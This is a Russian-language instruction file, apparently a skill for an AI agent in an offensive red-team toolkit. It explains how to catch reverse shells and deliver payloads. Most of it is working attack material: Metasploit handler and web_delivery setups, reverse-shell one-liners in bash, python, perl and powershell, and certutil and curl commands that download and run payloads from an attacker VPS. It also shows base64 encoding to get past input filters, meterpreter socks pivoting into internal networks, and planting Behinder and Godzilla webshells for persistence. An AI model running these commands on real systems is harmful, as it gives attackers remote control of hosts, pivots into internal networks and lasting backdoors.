---
name: shell-handler
description: Reverse shell и доставка payload: поднять на VPS слушатель MSF/nc/socat и принять shell либо заставить цель сама забрать payload
whenToUse: Когда нужен обратный коннект по RCE/выполнению команд, доставка следующего payload или превращение разового выполнения команд в интерактивную сессию
role: exploit
enabled: true
---

# Reverse shell и доставка payload (получение обратной сессии)

> **Сначала загрузите конфигурацию VPS**: все `$REDTEAM_VPS_HOST` / `$VPS_USER` в этом навыке берутся из локальной конфигурации,
> при первом запуске их записывает `bash $DSH_HOME/redteam/setup.sh` в `$DSH_HOME/.env`. Перед каждой командой выполните source один раз:
> ```bash
> set -a; . "$DSH_HOME/.env" 2>/dev/null || . "$HOME/.dsh/.env"; set +a
> VPS_USER="${REDTEAM_VPS_USER:-ubuntu}"; VPS="$REDTEAM_VPS_HOST"
> ```
> Если ещё не настраивали, запустите один раз `setup.sh` (навык `redteam-setup`): он заодно проверит SSH-связность и сервис доставки payload.

**Выполнение команд ≠ сессия**. Разовый `?cmd=whoami` доказывает только наличие дыры и не даёт постоянной работы. Этот навык превращает «умею выполнять команды»
в **стабильную, интерактивную и переиспользуемую** обратную сессию и доставляет следующий payload (веб-шелл, туннель, сканер).

## Инфраструктура на этой машине

| Пункт | Значение |
| --- | --- |
| VPS | `$REDTEAM_VPS_HOST` (порт SSH 22, приватный ключ `$DSH_HOME/redteam/toolkit/vps/id_rsa`) |
| Раздача payload | `http://$REDTEAM_VPS_HOST:9100/` (fscan/gogo, веб-шеллы Behinder и Godzilla уже синхронизированы) |
| Диапазон портов слушателя | `9000-9999` |
| Управление сессиями | `tmux` (слушатель обязан работать в tmux, иначе при обрыве всё теряется) |
| Инструменты на машине | `nc`, `socat`, `msfconsole` 6.5.3 (`exploit/multi/handler`, `exploit/multi/script/web_delivery` проверены — есть) |

Сопутствующие навыки: `vps-reverse-shell` (конкретные действия по входу на VPS и слушателю), `webshell-toolkit` (размещение веб-шеллов Behinder/Godzilla).

## 1. Что выбирать и когда

| Сценарий | Что использовать |
| --- | --- |
| **Временная проверка** (нужно прогнать одну команду и увидеть вывод) | `nc -lvnp <port>` + обратное подключение bash/python с цели; если хватает — так и идите |
| **Долгая работа / передача файлов / туннели** (**основной вариант**) | **MSF `multi/handler`** (автопереподключение, можно поднять до meterpreter, умеет socks) |
| **Цель выпускает только HTTP(S)** | `web_delivery` (MSF выдаёт одну команду, цель сама забирает payload) |
| **Цель на Windows, нужна стабильность** | MSF handler + подъём через `shell_to_meterpreter` |
| **Нужно проксировать трафик из внутренней сети** | после получения shell **не** используйте shell как прокси, а разместите WebShell → `suo5-tunnel` (см. навык) |

## 2. MSF handler (рекомендуемый основной вариант)

```bash
# 1) поднять слушатель в tmux на VPS (можно на этой машине или на VPS — зависит от направления коннекта)
tmux new -s handler
msfconsole -q

msf6 > use exploit/multi/handler
msf6 > set payload linux/x64/meterpreter/reverse_tcp   # для Windows: windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST $REDTEAM_VPS_HOST
msf6 > set LPORT 9001
msf6 > set ExitOnSession false      # ключевое: не завершаться при обрыве сессии, ждать переподключения
msf6 > exploit -j                    # слушатель в фоне
```

**Перед запуском слушателя проверьте, что порт свободен**: `ss -lntp | grep 9001`; в security group VPS порт должен быть открыт.

Пример полной цепочки: разовая доставка и приём сессии:
```bash
# на стороне цели (предполагаем наличие точки выполнения команд)
bash -c 'bash -i >& /dev/tcp/$REDTEAM_VPS_HOST/9001 0>&1'
# если bash нет, используйте другой вариант (см. таблицу ниже)
```

## 3. Однострочники обратного подключения по языкам (выбор по среде цели)

```bash
# Linux - bash
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
# Linux - без bash (sh + nc)
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc <IP> <PORT> > /tmp/f
# Linux - python3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<IP>",<PORT>));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh","-i"])'
# Linux - perl
perl -e 'use Socket;$i="<IP>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
# Windows - powershell (следите за экранированием и политикой выполнения)
powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TCPClient('<IP>',<PORT>);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}"
# Windows - скачать payload через certutil и выполнить
certutil -urlcache -split -f http://$REDTEAM_VPS_HOST:9100/fscan.exe C:\Windows\Temp\f.exe && C:\Windows\Temp\f.exe -h 10.0.0.0/24
# Linux - скачать payload через curl/wget
curl -s http://$REDTEAM_VPS_HOST:9100/gogo -o /tmp/gogo && chmod +x /tmp/gogo && /tmp/gogo -i 10.0.0.0/24 -m ss
```

**Обход через кодирование**: если пробелы или кавычки в команде блокируются, кодируйте в base64 и декодируйте на месте:
```bash
# сформировать (на этой машине)
echo -n 'bash -i >& /dev/tcp/$REDTEAM_VPS_HOST/9001 0>&1' | base64 -w0
# выполнить на цели
echo <BASE64> | base64 -d | bash
```

## 4. MSF web_delivery (когда выход только HTTP)

```bash
msf6 > use exploit/multi/script/web_delivery
msf6 > set target 7              # 7 = Linux Python (сначала show targets и посмотрите список)
msf6 > set payload python/meterpreter/reverse_tcp
msf6 > set LHOST $REDTEAM_VPS_HOST
msf6 > set LPORT 9002
msf6 > exploit -j
# MSF выдаст одну строку команды (вида python -c "import urllib.request;..."),
# её нужно вставить в точку выполнения команд на цели → цель сама заберёт payload → сессия установится
```

## 5. Подъём и поддержание

```bash
# поднять shell до meterpreter (socks, передача файлов, повышение привилегий)
msf6 > sessions -l
msf6 > sessions -u <id>            # либо post/multi/manage/shell_to_meterpreter

# поднять socks-прокси во внутреннюю сеть через meterpreter
meterpreter > run autoroute -s 10.0.0.0/24
meterpreter > background
msf6 > use auxiliary/server/socks_proxy
msf6 > set SRVPORT 1080
msf6 > set VERSION 5
msf6 > exploit -j
# затем направить proxychains на 127.0.0.1:1080 и работать во внутренней сети
```
> ⚠️ Правило зачёта: **прокси только на своём VPS туннелем не считается**. Цели внутренней сети, достигнутые через meterpreter autoroute, относятся к
> `entry_kind=target-agent` (транзит через контролируемый процесс на цели); при регистрации `redteam_tunnel_add` обязательно указывайте сторону цели.

## 6. Дисциплина (обязательно)

1. **Слушатель обязан работать в tmux**: обрыв SSH убьёт слушатель и сессия потеряется. `tmux new -s handler` / `tmux a -t handler`.
2. **Сначала проверьте занятость порта**, откройте его в security group VPS; не поднимайте слишком много слушателей одновременно (используйте диапазон 9000-9999 по порядку).
3. **Reverse shell — это «цель сама идёт наружу»**: при ограниченном выходе сначала пробуйте HTTP(S) (80/443/8080),
   если выхода нет вообще — остаётся только WebShell + туннель (`suo5-tunnel`).
4. **Не запускайте на продакшн-системах payload, который перезапускает службы**; для повышения привилегий и уязвимостей ядра сначала оцените риск перезагрузки.
5. **Сессии нужно регистрировать**: получив shell, сразу `redteam_session_check`, чтобы дальше им пользоваться; регистрация туннелей — `redteam_tunnel_add`.

## 7. Вывод и запись в базу (обязательно)

1. **Очки сразу после получения обратной сессии**: `redteam_score_hit` (`server-host` / `server-host`), в `evidence` писать «актив｜тип shell и права» (например `10.0.0.5｜root shell (uid=0)`).
2. **Запись сессии**: `redteam_access_add` (`method=reverse-shell`, указать `target`, `user`, `privilege`, адрес и порт слушателя).
3. **Запись туннеля** (если через него вошли во внутреннюю сеть): `redteam_tunnel_add`, в `entry_kind` обязательно указать сторону цели
   (`target-outbound` = обратное подключение с цели / на цели запущен клиент frp, `target-http` = suo5 через WebShell на цели, `target-agent` = транзит через контролируемый процесс на цели),
   затем `redteam_session_check` для фактической проверки связности.
4. Каждое ключевое действие — `redteam_chain_add`: `stage_code=internet` (получение прав с интернета) / `boundary` (поднятие туннеля) / `internal`,
   в `tool` — **фактический текст команды** (полная команда обратного подключения или конфигурация MSF), в `result` — выдержка вывода (например `uid=0(root) gid=0(root)`).
5. **Передайте пользователю переиспользуемую точку входа**: в приоритете разместить **веб-шелл Behinder/Godzilla** (навык `webshell-toolkit`) — пользователь сможет работать из консоли напрямую;
   про временную обратную сессию нужно сказать: «это разовая сессия, не точка входа для передачи».
